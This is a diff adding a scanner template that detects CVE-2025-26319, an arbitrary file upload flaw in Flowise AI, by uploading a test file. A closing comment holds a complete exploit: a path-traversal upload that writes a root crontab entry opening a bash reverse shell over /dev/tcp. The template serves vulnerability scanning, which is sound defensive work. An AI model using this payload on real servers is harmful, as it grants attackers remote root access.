@@ -1,0 +1,51 @@
+id: FlowiseAI-attachments-rce
+
+info:
+  name: Flowise AI 系统任意文件上传漏洞（CVE-2025-26319）
+  author: FlowiseAI
+  severity: critical
+  tags: FlowiseAI
+
+http:
+  - raw:
+      - |
+        POST /api/v1/attachments/test/test HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        x-request-from: internal
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="files"; filename="{{randstr}}.txt"
+        Content-Type: text/plain
+
+        2d5s3slodeowkidjqiwkhfjsdha
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+          - "mimeType"
+          - "content"
+        part: body
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+#POST /api/v1/attachments/..%2f..%2f..%2f..%2f..%2fetc/./ HTTP/1.1
+#Host: 127.0.0.1
+#User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+#Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+#------WebKitFormBoundary7MA4YWxkTrZu0gW
+#Content-Disposition: form-data; name="files"; filename="crontab"
+#Content-Type: text/plain
+#*/1 * * * * root bash -c "bash -i >& /dev/tcp/127.0.0.1/8346 0>&1"
+#------WebKitFormBoundary7MA4YWxkTrZu0gW--
